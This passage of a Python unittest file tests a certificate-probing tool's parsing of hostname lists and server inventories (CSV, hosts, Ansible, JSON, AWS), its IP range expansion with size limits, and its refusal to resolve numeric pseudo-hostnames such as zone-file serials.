        self.assertEqual(cert.covers('cdn.example-test.com.tr'), (False, None))
        self.assertEqual(cert.covers('xn--mnchen-3ya.example-test.com.tr'),
                         (True, 'xn--mnchen-3ya.example-test.com.tr'))


class NamesTests(unittest.TestCase):

    def test_parse_names_text(self):
        text = ('\ufeffwww.Example.com\n*.example.com   # the wildcard\n'
                'https://api.example.com:8443/health, m\u00fcnchen.example.com;dup.example.com\n'
                'dup.example.com\n10.0.0.1\nsingle\n; comment line\n// another\n')
        valid, invalid = sos.parse_names_text(text)
        self.assertEqual(valid, ['www.example.com', '*.example.com', 'api.example.com',
                                 'xn--mnchen-3ya.example.com', 'dup.example.com'])
        self.assertEqual(invalid, ['10.0.0.1', 'single'])

    def test_load_names_from_args_and_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'names.txt')
            with open(path, 'w', encoding='utf-16') as handle:  # PowerShell-style UTF-16
                handle.write('a.example.com\nb.example.com\n')
            names, warnings = sos.load_names([path, 'c.example.com a.example.com', '10.1.1.1'])
            self.assertEqual(names, ['a.example.com', 'b.example.com', 'c.example.com'])
            self.assertEqual(len(warnings), 1)
            self.assertIn('IP address', warnings[0])
            with self.assertRaises(sos.UsageError):
                sos.load_names([os.path.join(tmp, 'missing.txt')])
            names, _ = sos.load_names(['-'], stdin=io.StringIO('x.example.com\n'))
            self.assertEqual(names, ['x.example.com'])
            names, _ = sos.load_names(['https://url.example.com/x.txt'])
            self.assertEqual(names, ['url.example.com'])

    def test_build_probe_names(self):
        probes = sos.build_probe_names(['*.example.com', 'example.com', 'WWW.example.com',
                                        'www.example.com'])
        self.assertEqual([(p.name, p.sni, p.wildcard) for p in probes], [
            ('example.com', 'example.com', False),
            ('*.example.com', 'ssl-origin-scan-wildcard-probe.example.com', True),
            ('www.example.com', 'www.example.com', False),
        ])
        probes = sos.build_probe_names(['*.example.com'], wildcard_probe=False)
        self.assertEqual([p.name for p in probes], ['example.com'])
        long_base = '.'.join(['a' * 60] * 4)  # 243 chars: synthetic SNI would exceed 253
        probes = sos.build_probe_names(['*.' + long_base])
        self.assertEqual([p.name for p in probes], [long_base])


# ======================================================================== inventory

def servers_by_name(inventory) -> Dict[str, object]:
    return {server.name: server for server in inventory.servers}


# Inventories whose parse must match the web app's parseInventory (lib/inventory.js).
INVENTORY_PARITY_CASES = {
    'management columns': (
        'name,ip_address,gateway_ip,ilo_ip,dns_ip,mac_address,ntp_server_address\n'
        'web01,10.0.0.5,10.0.0.1,10.10.0.5,10.0.0.2,00:11:22:33:44:55,10.0.0.123\n'
        'web02,10.0.0.6,10.0.0.1,10.10.0.6,10.0.0.2,00:11:22:33:44:56,10.0.0.123\n'),
    'e-mail column': ('name,ip_address,admin_email_address\ndb01,10.0.0.9,\n'
                      'db02,,dba@mail.example.com\n'),
    'Turkish headers': 'Sunucu Adı;IP Adresi;Ortam\nweb01;10.0.0.5;prod\n',
    'Turkish device': 'Cihaz Adı,İP,Grup\nfw01,10.0.0.7,edge\n',
    'name columns': 'Display Name,Hostname,IP\nWeb One,web01,10.0.0.5\n',
    'header line': 'hostname   ip\nweb01 10.0.0.5\n',
}


class InventoryTests(unittest.TestCase):

    def test_plain_lines_and_merging(self):
        text = ('# my servers\nweb01 10.0.0.1 10.0.0.2\n10.0.0.3\n10.0.0.4 web04\n'
                '; ini comment\n// js comment\nweb01, 10.0.0.9  # inline comment\n'
                'WEB01 10.0.0.2\nweb05;10.0.0.5\n')
        inv = sos.parse_inventory(text)
        servers = servers_by_name(inv)
        self.assertEqual(list(servers), ['web01', '10.0.0.3', 'web04', 'web05'])
        self.assertEqual(servers['web01'].ips, ['10.0.0.1', '10.0.0.2', '10.0.0.9'])
        self.assertEqual(servers['web01'].line, 2)
        self.assertEqual(servers['web04'].ips, ['10.0.0.4'])
        self.assertEqual(inv.stats, {'lines': 9, 'servers': 4, 'ips': 6})
        self.assertEqual(inv.warnings, [])

    def test_hosts_file(self):
        text = ('127.0.0.1\tlocalhost\n::1     localhost ip6-localhost ip6-loopback\n'
                'ff02::1 ip6-allnodes\n10.1.1.1 app.corp.local app\n'
                '2001:db8::10 v6.corp.local\n')
        inv = sos.parse_inventory(text, 'hosts')
        servers = servers_by_name(inv)
        self.assertEqual(servers['localhost'].ips, ['127.0.0.1', '::1'])
        self.assertEqual(servers['app.corp.local'].ips, ['10.1.1.1'])
        self.assertEqual(servers['v6.corp.local'].ips, ['2001:db8::10'])
        self.assertNotIn('ip6-allnodes', servers)
        self.assertEqual([w.code for w in inv.warnings], ['INVALID_IP'])
        self.assertIn('hosts:3', str(inv.warnings[0]))

    def test_csv_with_header(self):
        text = ('Name,Public IP,PrivateIpAddress,Env,Notes\n'
                'web01,203.0.113.10,10.0.0.10,prod,"has, comma"\n'
                'web02,,10.0.0.11,stage,\n'
                'db01.example.com,,,prod,\n'
                '10.0.0.12,,,,\n'
                ',,10.0.0.13,,\n'
                'bad,300.1.1.1,,,\n')
        inv = sos.parse_inventory(text)
        servers = servers_by_name(inv)
        self.assertEqual(servers['web01'].ips, ['203.0.113.10', '10.0.0.10'])
        self.assertEqual(servers['web01'].groups, ['prod'])
        self.assertEqual(servers['web02'].ips, ['10.0.0.11'])
        self.assertEqual(servers['db01.example.com'].ips, [])
        self.assertEqual(servers['db01.example.com'].hostnames, ['db01.example.com'])
        self.assertEqual(servers['10.0.0.12'].ips, ['10.0.0.12'])
        self.assertEqual(servers['10.0.0.13'].ips, ['10.0.0.13'])
        self.assertNotIn('bad', servers)
        self.assertIn('INVALID_IP', [w.code for w in inv.warnings])

    def test_tsv_semicolon_and_multi_ip_cells(self):
        tsv = sos.parse_inventory('hostname\tip_address\nweb01\t10.0.0.1\n')
        self.assertEqual(servers_by_name(tsv)['web01'].ips, ['10.0.0.1'])
        semi = sos.parse_inventory('server;ipv4;ipv6\nweb01;10.0.0.1;2001:db8::1\n')
        self.assertEqual(servers_by_name(semi)['web01'].ips, ['10.0.0.1', '2001:db8::1'])
        multi = sos.parse_inventory('name,ips\n"web01","10.0.0.1, 10.0.0.2 | 10.0.0.3"\n')
        self.assertEqual(servers_by_name(multi)['web01'].ips,
                         ['10.0.0.1', '10.0.0.2', '10.0.0.3'])
        hostish = sos.parse_inventory('name,ansible_host\nweb01,web01.internal\n')
        self.assertEqual(servers_by_name(hostish)['web01'].hostnames, ['web01.internal'])

    def test_csv_management_columns_are_not_server_addresses(self):
        inv = sos.parse_inventory(INVENTORY_PARITY_CASES['management columns'])
        servers = servers_by_name(inv)
        self.assertEqual(servers['web01'].ips, ['10.0.0.5'])   # not the gateway, iLO, DNS, NTP
        self.assertEqual(servers['web02'].ips, ['10.0.0.6'])
        self.assertEqual(inv.warnings, [])                     # no DUPLICATE_IP noise
        for header in ('gateway_ip', 'ilo_ip', 'idrac_address', 'bmc_ip', 'ipmi_ip', 'dns_ip',
                       'ntp_server_address', 'mac_address', 'admin_email_address', 'netmask',
                       'web_url', 'subnet_ip', ''):
            self.assertFalse(sos._is_ip_header(header), header)
        for header in ('ip', 'ip_address', 'public_ip', 'ip2', 'ipv6', 'ip_adresi', 'adres',
                       'ansible_host', 'private_ip_addresses'):
            self.assertTrue(sos._is_ip_header(header), header)

    def test_email_addresses_are_never_resolved(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'inv.csv')
            Path(path).write_text(INVENTORY_PARITY_CASES['e-mail column']
                                  + 'db03,ops@mail.example.com,\n', encoding='utf-8')
            resolver = RecordingResolver({'db02': ['10.0.0.10']})
            servers, warnings = sos.load_targets([path], resolver=resolver)
        # db02 (no IP) is resolved by its own name, as any name-only row; never the mailbox's host
        self.assertEqual(resolver.calls, ['db02'])
        self.assertEqual({s.name: s.ips for s in servers}, {'db01': ['10.0.0.9'],
                                                             'db02': ['10.0.0.10']})
        self.assertIn('PARSE ops@mail.example.com', [str(w).split(': ', 1)[1] for w in warnings])

    def test_csv_turkish_headers(self):
        servers = servers_by_name(sos.parse_inventory(INVENTORY_PARITY_CASES['Turkish headers']))
        self.assertEqual((servers['web01'].ips, servers['web01'].groups), (['10.0.0.5'], ['prod']))
        servers = servers_by_name(sos.parse_inventory(INVENTORY_PARITY_CASES['Turkish device']))
        self.assertEqual((servers['fw01'].ips, servers['fw01'].groups), (['10.0.0.7'], ['edge']))
        self.assertEqual(sos._normalize_header('Sunucu Adı'), 'sunucu_adi')
        self.assertEqual(sos._normalize_header('İP Adresi'), 'ip_adresi')
        self.assertEqual(sos._normalize_header('PrivateIpAddress'), 'private_ip_address')

    def test_best_name_column_wins(self):
        servers = servers_by_name(sos.parse_inventory(INVENTORY_PARITY_CASES['name columns']))
        self.assertEqual(list(servers), ['web01'])  # hostname outranks a display name

    def test_plain_header_line_is_skipped(self):
        resolver = RecordingResolver()
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'servers.txt')
            Path(path).write_text(INVENTORY_PARITY_CASES['header line'], encoding='utf-8')
            servers, warnings = sos.load_targets([path], resolver=resolver)
        self.assertEqual([(s.name, s.ips) for s in servers], [('web01', ['10.0.0.5'])])
        self.assertEqual((resolver.calls, warnings), ([], []))

    def test_host_names_that_look_like_headings_are_resolved(self):
        # EC2-style default names, ipv6. / addr. host names and one-word hosts: a heading
        # check that dropped them would lose these servers without a warning
        hosts = ['ip-10-0-1-23.eu-west-1.compute.example.net', 'ip-10-0-1-24',
                 'ipv6.example.com', 'ip6.example.net', 'addr.example.com', 'node', 'server']
        table = {host: ['192.0.2.%d' % number] for number, host in enumerate(hosts, 11)}
        resolver = RecordingResolver(table)
        text = ('# zone-targets.txt\nweb01 192.0.2.10\n' + '\n'.join(hosts)
                + '\nhostname   ip\nSunucu Adı   IP Adresi   Ortam\nName;Public IP;Env\n'
                '| name | ipv4 | ipv6 |\nwww.example.com\n')
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'zone-targets.txt')
            Path(path).write_text(text, encoding='utf-8')
            servers, warnings = sos.load_targets([path], resolver=resolver)
        self.assertEqual(sorted(resolver.calls), sorted(hosts + ['www.example.com']))
        self.assertEqual({s.name: s.ips for s in servers}, dict(table, web01=['192.0.2.10']))
        self.assertEqual(len(warnings), 1)  # www.example.com does not resolve here
        for heading in (['hostname', 'ip'], ['host', 'ip2', 'ipv6'], ['Server', 'Name', 'IP']):
            self.assertTrue(sos._is_header_like(heading), heading)
        for line in (['hostname'], ['ip'], ['web01', 'ip'], ['ipv6.example.com', 'name'],
                     ['ip-10-0-1-23', 'host'], ['hostname', 'gateway']):
            self.assertFalse(sos._is_header_like(line), line)

    @unittest.skipUnless(_node_major() >= 22, 'needs Node 22+ to run assets/js/lib/inventory.js')
    def test_inventory_cases_match_the_web_app(self):
        script = ('import { parseInventory } from %s;\n'
                  'const cases = JSON.parse(process.argv[1]);\n'
                  'console.log(JSON.stringify(cases.map((c) => parseInventory(c).servers'
                  '.map((s) => [s.name, s.ips, s.groups]))));\n'
                  % json.dumps((ROOT / 'assets' / 'js' / 'lib' / 'inventory.js').as_uri()))
        texts = list(INVENTORY_PARITY_CASES.values())
        proc = subprocess.run([shutil.which('node'), '--input-type=module', '-e', script,
                               json.dumps(texts)], capture_output=True, text=True,
                              encoding='utf-8', timeout=60, cwd=str(ROOT))
        self.assertEqual(proc.returncode, 0, proc.stderr)
        for label, text, web in zip(INVENTORY_PARITY_CASES, texts, json.loads(proc.stdout)):
            with self.subTest(case=label):
                cli = [[s.name, s.ips, s.groups] for s in sos.parse_inventory(text).servers
                       if s.ips]  # the CLI also keeps name-only rows, to resolve them
                self.assertEqual(cli, web)

    def test_csv_detection_does_not_hijack_data_lines(self):
        inv = sos.parse_inventory('web01,10.0.0.1\nweb02,10.0.0.2\n')
        self.assertEqual(sorted(servers_by_name(inv)), ['web01', 'web02'])

    def test_ansible_ini(self):
        text = ('[web]\nweb01 ansible_host=10.0.0.1 ansible_user=deploy\nweb02.example.com\n'
                '10.0.0.3\n\n[db]\ndb01 ansible_host=10.0.0.5 ansible_port=2222\n'
                'db02 ansible_host=db02.internal\n\n'
                '[web:vars]\nhttp_port=80\n\n[prod:children]\nweb\ndb\n\n'
                '[monitoring]\nmon01 ansible_host=[2001:db8::99]\n')
        servers = servers_by_name(sos.parse_inventory(text))
        self.assertEqual(servers['web01'].ips, ['10.0.0.1'])
        self.assertEqual(servers['web01'].groups, ['web'])
        self.assertEqual(servers['web02.example.com'].hostnames, ['web02.example.com'])
        self.assertEqual(servers['10.0.0.3'].groups, ['web'])
        self.assertEqual(servers['db01'].ips, ['10.0.0.5'])
        self.assertEqual(servers['db01'].groups, ['db'])
        self.assertEqual(servers['db02'].hostnames, ['db02.internal'])
        self.assertEqual(servers['mon01'].ips, ['2001:db8::99'])
        for skipped in ('http_port=80', 'web', 'db', 'prod'):
            self.assertNotIn(skipped, servers)

    def test_ansible_yaml(self):
        text = ('---\nall:\n  children:\n    web:\n      hosts:\n        web01:\n'
                '          ansible_host: 10.0.0.1\n        web02.example.com:\n'
                '    db:\n      hosts:\n        db01:\n          ansible_host: "10.0.0.5"\n'
                '          ansible_user: root   # comment\n')
        servers = servers_by_name(sos.parse_inventory(text))
        self.assertEqual(servers['web01'].ips, ['10.0.0.1'])
        self.assertEqual(servers['web01'].groups, ['web'])
        self.assertEqual(servers['web02.example.com'].hostnames, ['web02.example.com'])
        self.assertEqual(servers['web02.example.com'].groups, ['web'])
        self.assertEqual(servers['db01'].ips, ['10.0.0.5'])
        self.assertEqual(servers['db01'].groups, ['db'])
        simple = servers_by_name(sos.parse_inventory('web01:\n  ansible_host: 10.9.9.9\n'))
        self.assertEqual(simple['web01'].ips, ['10.9.9.9'])

    def test_json_formats(self):
        array = sos.parse_inventory(json.dumps([
            {'name': 'web01', 'ip': '10.0.0.1', 'netmask': '255.255.255.0',
             'gateway': '10.0.0.254', 'dns_servers': ['8.8.8.8']},
            {'hostname': 'web02', 'addresses': ['10.0.0.2', '2001:db8::2']},
            {'Name': 'web03'},
            '10.0.0.4', 'web05 10.0.0.5', 'free text without address']))
        servers = servers_by_name(array)
        self.assertEqual(servers['web01'].ips, ['10.0.0.1'])
        self.assertEqual(servers['web02'].ips, ['10.0.0.2', '2001:db8::2'])
        self.assertEqual(servers['web03'].hostnames, ['web03'])
        self.assertEqual(servers['10.0.0.4'].ips, ['10.0.0.4'])
        self.assertEqual(servers['web05'].ips, ['10.0.0.5'])

        aws = sos.parse_inventory(json.dumps({'Reservations': [{'Instances': [{
            'InstanceId': 'i-1', 'PrivateIpAddress': '10.0.0.1', 'PublicIpAddress': '203.0.113.1',
            'Tags': [{'Key': 'Env', 'Value': 'prod'}, {'Key': 'Name', 'Value': 'web01'}]}]}]}))
        self.assertEqual(servers_by_name(aws)['web01'].ips, ['10.0.0.1', '203.0.113.1'])

        mapping = sos.parse_inventory(json.dumps({'web01': '10.0.0.1',
                                                  'web02': ['10.0.0.2', '10.0.0.3'],
                                                  'web03': {'ansible_host': '10.0.0.4'},
                                                  'web04': 'web04.internal'}))
        servers = servers_by_name(mapping)
        self.assertEqual(servers['web01'].ips, ['10.0.0.1'])
        self.assertEqual(servers['web02'].ips, ['10.0.0.2', '10.0.0.3'])
        self.assertEqual(servers['web03'].ips, ['10.0.0.4'])
        self.assertEqual(servers['web04'].hostnames, ['web04.internal'])

        ansible = sos.parse_inventory(json.dumps({
            '_meta': {'hostvars': {'web01': {'ansible_host': '10.0.0.1'},
                                   'web02': {'ansible_host': 'web02.internal'}}},
            'web': {'hosts': ['web01', 'web02']}}))
        servers = servers_by_name(ansible)
        self.assertEqual(servers['web01'].ips, ['10.0.0.1'])
        self.assertEqual(servers['web02'].hostnames, ['web02.internal'])

        tags = sos.parse_inventory(json.dumps({'servers': [
            {'tags': {'Name': 'tagged'}, 'network': {'public_ip': '198.51.100.7'}}]}))
        self.assertEqual(servers_by_name(tags)['tagged'].ips, ['198.51.100.7'])

    def test_invalid_json_falls_back_to_lines(self):
        inv = sos.parse_inventory('[web]\nweb01 ansible_host=10.0.0.1\n')
        self.assertEqual(servers_by_name(inv)['web01'].ips, ['10.0.0.1'])

    def test_warnings(self):
        inv = sos.parse_inventory('a 10.0.0.1\nb 10.0.0.1\nweb 10.0.0.300\n0.0.0.0\n$$$\n')
        codes = [w.code for w in inv.warnings]
        self.assertIn('INVALID_IP', codes)
        self.assertIn('DUPLICATE_IP', codes)
        self.assertIn('NO_IP', codes)
        servers = servers_by_name(inv)
        self.assertNotIn('web', servers)  # typo'd IP: not silently resolved by name
        self.assertEqual(servers['a'].ips, servers['b'].ips)

    def test_cidr_and_ranges(self):
        servers = servers_by_name(sos.parse_inventory('dmz 10.0.1.0/30\n'))
        self.assertEqual(list(servers), ['10.0.1.1', '10.0.1.2'])
        self.assertEqual(servers['10.0.1.1'].groups, ['dmz'])
        self.assertEqual(sos.expand_ip_block('10.0.0.5/32'), ['10.0.0.5'])
        self.assertEqual(sos.expand_ip_block('10.0.0.4/31'), ['10.0.0.4', '10.0.0.5'])
        self.assertEqual(sos.expand_ip_block('10.0.0.7/30'),
                         ['10.0.0.5', '10.0.0.6'])  # host bits tolerated
        self.assertEqual(len(sos.expand_ip_block('2001:db8::/126')), 3)
        self.assertEqual(sos.expand_ip_block('10.0.0.5-7'), ['10.0.0.5', '10.0.0.6', '10.0.0.7'])
        self.assertEqual(len(sos.expand_ip_block('10.0.0.250-10.0.1.2')), 9)
        self.assertEqual(sos.expand_ip_block('2001:db8::1-2001:db8::2'),
                         ['2001:db8::1', '2001:db8::2'])
        self.assertEqual(len(sos.expand_ip_block('10.0.0.0/16')), 65534)
        self.assertIsNone(sos.expand_ip_block('10.0.0.1'))
        self.assertIsNone(sos.expand_ip_block('some-name'))
        self.assertIsNone(sos.expand_ip_block('dir/file'))
        self.assertTrue(sos.is_ip_block('10.0.0.0/8'))
        self.assertFalse(sos.is_ip_block('web-01'))

    def test_large_blocks_need_allow_large(self):
        with self.assertRaisesRegex(sos.UsageError, 'allow-large'):
            sos.expand_ip_block('10.0.0.0/15')
        with self.assertRaisesRegex(sos.UsageError, 'allow-large'):
            sos.parse_inventory('10.0.0.0/8\n')
        self.assertEqual(len(sos.expand_ip_block('10.0.0.0/15', allow_large=True)), 131070)
        with self.assertRaisesRegex(sos.UsageError, 'maximum'):
            sos.expand_ip_block('10.0.0.0/11', allow_large=True)
        with self.assertRaisesRegex(sos.UsageError, 'range'):
            sos.expand_ip_block('10.0.0.9-10.0.0.1')

    def test_read_text_file_encodings(self):
        with tempfile.TemporaryDirectory() as tmp:
            for encoding in ('utf-8', 'utf-8-sig', 'utf-16', 'utf-16-be'):
                path = os.path.join(tmp, encoding + '.txt')
                with open(path, 'w', encoding=encoding, newline='\n') as handle:
                    handle.write('sunucu-\u00e7 10.0.0.1\n')
                if encoding == 'utf-16-be':  # add a BOM manually
                    Path(path).write_bytes(b'\xfe\xff' + Path(path).read_bytes())
                self.assertEqual(sos.read_text_file(path), 'sunucu-\u00e7 10.0.0.1\n', encoding)
            path = os.path.join(tmp, 'latin1.txt')
            Path(path).write_bytes(b'caf\xe9 10.0.0.1\n')
            self.assertEqual(sos.read_text_file(path), 'caf\u00e9 10.0.0.1\n')


class LoadTargetsTests(unittest.TestCase):

    def fake_resolver(self, host: str) -> List[str]:
        table = {'web01.internal': ['10.1.1.1', 'fd00::1', '10.1.1.1'],
                 'app.internal': ['10.2.2.2'], 'zero.internal': ['0.0.0.0']}
        if host not in table:
            raise socket.gaierror(11001, 'getaddrinfo failed')
        return table[host]

    def test_mixed_targets(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'inv.txt')
            with open(path, 'w', encoding='utf-8') as handle:
                handle.write('web01 10.0.0.1\napp.internal\n')
            servers, warnings = sos.load_targets(
                [path, '10.0.0.9,10.0.0.12/31', 'web01.internal', 'db=10.0.0.20',
                 'missing.internal', 'zero.internal', 'WEB01=10.0.0.2'],
                resolver=self.fake_resolver)
        by_name = {s.name: s for s in servers}
        self.assertEqual(by_name['web01'].ips, ['10.0.0.1', '10.0.0.2'])
        self.assertEqual(by_name['app.internal'].ips, ['10.2.2.2'])
        self.assertEqual(by_name['web01.internal'].ips, ['10.1.1.1', 'fd00::1'])
        self.assertEqual(by_name['db'].ips, ['10.0.0.20'])
        self.assertEqual(by_name['10.0.0.12'].groups, ['10.0.0.12/31'])
        self.assertIn('10.0.0.13', by_name)
        self.assertNotIn('missing.internal', by_name)
        self.assertNotIn('zero.internal', by_name)
        messages = [str(w) for w in warnings]
        self.assertTrue(any('missing.internal' in m and 'RESOLVE' in m for m in messages))
        self.assertTrue(any('zero.internal' in m for m in messages))

    def test_stdin_and_errors(self):
        servers, _ = sos.load_targets(['-'], stdin=io.StringIO('s1 10.0.0.1\n'),
                                      resolver=self.fake_resolver)
        self.assertEqual([s.name for s in servers], ['s1'])
        with self.assertRaisesRegex(sos.UsageError, 'not found'):
            sos.load_targets(['nope/targets.txt'])
        with self.assertRaisesRegex(sos.UsageError, 'not found'):
            sos.load_targets(['targets.csv'])
        with self.assertRaisesRegex(sos.UsageError, 'invalid target'):
            sos.load_targets(['bad!token'])
        with self.assertRaisesRegex(sos.UsageError, 'invalid target'):
            sos.load_targets(['10.0.0.300'])
        with self.assertRaisesRegex(sos.UsageError, 'allow-large'):
            sos.load_targets(['10.0.0.0/8'])

    def test_malformed_ranges_and_cidrs_are_never_resolved(self):
        # valid LDH names, so they used to reach the resolver (and a search domain)
        for token in ('10.0.0.5-300', '10.0.0.5-9x', '10.0.0.5-09', '192.168.1.10-192.168.1.2x',
                      'web=10.0.0.5-300'):
            with self.subTest(token=token):
                with self.assertRaisesRegex(sos.UsageError,
                                            r"invalid target .*not a valid IP range \(write"):
                    sos.parse_target_tokens(token)
        for token in ('10.0.0.0/33', '10.0.0.1/24x', '2001:db8::/129'):
            with self.subTest(token=token):
                with self.assertRaisesRegex(sos.UsageError, 'not a valid CIDR'):
                    sos.parse_target_tokens(token)  # was "target file not found"
        resolver = RecordingResolver()
        with self.assertRaises(sos.UsageError):
            sos.load_targets(['10.0.0.1 10.0.0.5-300'], resolver=resolver)
        self.assertEqual(resolver.calls, [])
        inv = sos.parse_inventory('10.0.0.1\n10.0.0.5-09\n10.0.0.5-300\n10.0.0.5-9x\n'
                                  'web01 10.0.0.5-300\nweb02 10.0.0.5-9x\n10.0.0.0/33\n', 'x.txt')
        self.assertEqual([s.name for s in inv.servers], ['10.0.0.1'])
        self.assertEqual([w.code for w in inv.warnings], ['INVALID_IP'] * 6)
        for text in ('name,ip\n10.0.0.5-300,\n', 'name,ip\nweb01,10.0.0.5-9x\n',
                     json.dumps({'web01': {'ansible_host': '10.0.0.5-9x'}})):
            with self.subTest(text=text):
                inv = sos.parse_inventory(text)
                self.assertEqual((inv.servers, [w.code for w in inv.warnings]),
                                 ([], ['INVALID_IP']))
        # names that only start like an address are still host names
        for name in ('10.0.0.5-web.example.com', '10.0.0.5-a.example.net', '10.0.0.5-web',
                     '192.0.2.1-db'):
            with self.subTest(name=name):
                self.assertEqual(sos.parse_target_tokens(name).servers[0].hostnames, [name])
        inv = sos.parse_inventory('192.0.2.1-db\n10.0.0.5-web.example.com\n', 'x.txt')
        self.assertEqual([(s.name, s.hostnames) for s in inv.servers],
                         [('192.0.2.1-db', ['192.0.2.1-db']),
                          ('10.0.0.5-web.example.com', ['10.0.0.5-web.example.com'])])
        self.assertEqual(inv.warnings, [])

    def test_browser_cli_suggestion_targets(self):
        # The web app's cliSuggestion `-t` tokens: an IPv4 /24 where origins cluster, exact IPv4
        # addresses otherwise, and exact IPv6 addresses (never the /48 it only displays).
        servers, warnings = sos.load_targets(['198.51.100.0/24', '203.0.113.10', '2001:db8:1234::1'],
                                             resolver=self.fake_resolver)
        ips = {ip for s in servers for ip in s.ips}
        self.assertIn('198.51.100.7', ips)
        self.assertIn('203.0.113.10', ips)
        self.assertIn('2001:db8:1234::1', ips)
        self.assertEqual(warnings, [])
        with self.assertRaisesRegex(sos.UsageError, 'allow-large'):
            sos.load_targets(['2001:db8:1234::/48'])

    def test_real_resolver_for_localhost(self):
        ips = sos.resolve_host('localhost')  # served from the hosts file, no network
        self.assertTrue(set(ips) & {'127.0.0.1', '::1'}, ips)


class RecordingResolver:
    """A resolver that records every lookup (numeric names must never reach it)."""

    def __init__(self, table: Optional[Dict[str, List[str]]] = None) -> None:
        self.table = table or {}
        self.calls = []  # type: List[str]

    def __call__(self, host: str) -> List[str]:
        self.calls.append(host)
        if host not in self.table:
            raise socket.gaierror(11001, 'getaddrinfo failed')
        return self.table[host]


# What the system resolver (inet_aton rules) dials for the SOA serial 2026092401: a public
# address, so it is computed here - the repo-hygiene test forbids real-world IP literals.
SERIAL_ADDRESS = str(ipaddress.IPv4Address(2026092401))

# A BIND zone passed as -t by mistake: the SOA serial and timers are "names" on their own
# lines, and glibc's getaddrinfo would turn 2026092401 into SERIAL_ADDRESS.
ZONE_AS_INVENTORY = (
    '$ORIGIN example.com.\n$TTL 3600\n'
    '@   IN SOA ns1.example.com. hostmaster.example.com. (\n'
    '        2026092401 ; serial\n        3600       ; refresh\n        1800       ; retry\n'
    '        1209600    ; expire\n        86400 )    ; minimum\n'
    'www IN A 192.0.2.10\n')


class NumericHostTests(unittest.TestCase):
    """Numeric "hostnames" (inet_aton forms) are refused, never resolved nor probed."""

    def test_is_numeric_host(self):
        numeric = ('2026092401', '3600', '127.1', '0x7f.0x1', '0X7F.0X1.', '0177.0.0.1',
                   '0x7f000001', '10.0.0.300', '1.2.3.4.5', '08.1', '0x', 'host.123',
                   'a.b.c.300', '*.0x7f.0x1', 'https://2026092401:8443/path',
                   '\uff11\uff12\uff17\uff0e\uff11',   # fullwidth digits and dot (NFKC)
                   '127\u30021')                        # ideographic full stop
        for value in numeric:
            with self.subTest(value=value):
                self.assertTrue(sos.is_numeric_host(value))
        for value in ('10.0.0.1', '::1', '2001:db8::1', 'www.example.com', '1password.com',
                      'deadbeef', 'x.0x10', 'localhost', 'web01', '', 'a..b'):
            with self.subTest(value=value):
                self.assertFalse(sos.is_numeric_host(value))

    def test_legacy_ipv4_mirrors_inet_aton(self):
        # verified against glibc and Windows inet_aton; the platform check below re-verifies
        platform = {'2026092401': SERIAL_ADDRESS, '127.1': '127.0.0.1',
                    '0x7f.0x1': '127.0.0.1', '0177.0.0.1': '127.0.0.1', '0x7f000001': '127.0.0.1',
                    '10.1.2': '10.1.0.2', '0': '0.0.0.0'}
        # glibc-only forms (Windows inet_addr rejects these two)
        cases = dict(platform, **{'0x': '0.0.0.0', '4294967295': '255.255.255.255'})
        for text, want in cases.items():
            with self.subTest(text=text):
                self.assertEqual(sos._legacy_ipv4(text), want)
                if text in platform:  # the platform's own parser agrees
                    self.assertEqual(socket.inet_ntoa(socket.inet_aton(text)), want)
        for text in ('4294967296', '1.2.3.4.5', '08.1', '256.1', '1.2.3.256', 'a.1', ''):
            with self.subTest(text=text):
                self.assertIsNone(sos._legacy_ipv4(text))

    def test_note_names_the_address_the_resolver_would_dial(self):
        self.assertIn(SERIAL_ADDRESS, sos.numeric_host_note('2026092401'))
        self.assertIn('127.0.0.1', sos.numeric_host_note('0x7f.0x1'))
        self.assertIn('numeric label', sos.numeric_host_note('host.123'))

    def test_target_tokens_are_usage_errors(self):
        for token in ('2026092401', '0x7f.0x1', '127.1', '0177.0.0.1', 'web=2026092401',
                      'web=127.1', 'https://0x7f.0x1/'):
            with self.subTest(token=token):
                with self.assertRaisesRegex(sos.UsageError, 'invalid target .*not a hostname'):
                    sos.parse_target_tokens(token)
        with self.assertRaisesRegex(sos.UsageError, re.escape(SERIAL_ADDRESS)):
            sos.parse_target_tokens('2026092401')
        with self.assertRaisesRegex(sos.UsageError, r'leading zero.*octal: 10\.0\.0\.1'):
            sos.parse_target_tokens('012.0.0.1')  # octal 012 = 10
        with self.assertRaisesRegex(sos.UsageError, 'invalid target'):
            sos.parse_target_tokens('10.0.0.300')  # a typo'd dotted quad keeps its message
        resolver = RecordingResolver()
        with self.assertRaises(sos.UsageError):
            sos.load_targets(['web01.internal 2026092401'], resolver=resolver)
        self.assertEqual(resolver.calls, [])  # refused before any lookup

    def test_zone_file_as_inventory_never_resolves_numbers(self):
        inv = sos.parse_inventory(ZONE_AS_INVENTORY, 'zone.txt')
        servers = servers_by_name(inv)
        self.assertEqual(servers['www'].ips, ['192.0.2.10'])
        hostnames = [host for server in inv.servers for host in server.hostnames]
        self.assertFalse([h for h in hostnames if sos.is_numeric_host(h)], hostnames)
        invalid = [w for w in inv.warnings if w.code == 'INVALID_IP']
        self.assertEqual(len(invalid), 5)  # serial, refresh, retry, expire, minimum
        self.assertIn(SERIAL_ADDRESS, str(invalid[0]))
        self.assertIn('zone.txt:4', str(invalid[0]))
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'zone.txt')
            with open(path, 'w', encoding='utf-8') as handle:
                handle.write(ZONE_AS_INVENTORY)
            resolver = RecordingResolver()
            servers, _ = sos.load_targets([path], resolver=resolver)
        self.assertEqual({ip for s in servers for ip in s.ips}, {'192.0.2.10'})
        self.assertFalse([h for h in resolver.calls if sos.is_numeric_host(h)], resolver.calls)

    def test_other_inventory_formats(self):
        csv_inv = sos.parse_inventory('name,ip\n1001,\nweb01,10.0.0.1\n')
        self.assertEqual(list(servers_by_name(csv_inv)), ['web01'])
        self.assertEqual([w.code for w in csv_inv.warnings], ['INVALID_IP'])
        json_inv = sos.parse_inventory(json.dumps([
            {'name': '1001'}, {'name': 'web', 'ansible_host': '2026092401'},
            {'name': 'ok', 'ip': '10.0.0.2'}]))
        self.assertEqual(list(servers_by_name(json_inv)), ['ok'])
        self.assertEqual([w.code for w in json_inv.warnings], ['INVALID_IP', 'INVALID_IP'])
